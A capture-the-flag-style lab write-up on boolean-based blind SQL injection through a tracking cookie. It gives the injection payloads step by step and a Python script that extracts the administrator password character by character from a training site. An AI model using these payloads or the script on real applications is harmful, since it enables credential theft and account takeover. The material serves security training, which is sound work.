## Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

---

## Notes

1/ Confirm that the parameter is vulnerable to "Boolean-based Blind SQL injection"

```sql
' AND 1=1--
```

```sql
' AND 1=2--
```

2/ Confirm that we have a "users" table

```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

3/ Confirm that username "administrator" exists in the "users" table

```sql
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

4/ Enumerate the password of the "administrator" user

```sql
' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)=20)='administrator'--
```

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

5/ Write a script to automate the password extraction

```python
import requests

import string

url = "https://0a36003103597773822975c400e80054.web-security-academy.net"

characters = string.ascii_letters + string.digits

password = ""

session = requests.Session()

tracking_id = session.get(url).cookies.get("TrackingId")

for position in range(1, 21):
    for char in characters:
        guess = password + char
        payload = (
            f"' AND (SELECT SUBSTRING(password,1,{position}) FROM users WHERE username='administrator')='{guess}'--"
        )

        response = session.get(
            url,
            cookies={"TrackingId": tracking_id + payload}
        )

        if "Welcome back" in response.text:
            password += char
            print("Found:", password)
            break
    else:
        print("No matching character found at position", position)
        break

print("Password:", password)
```

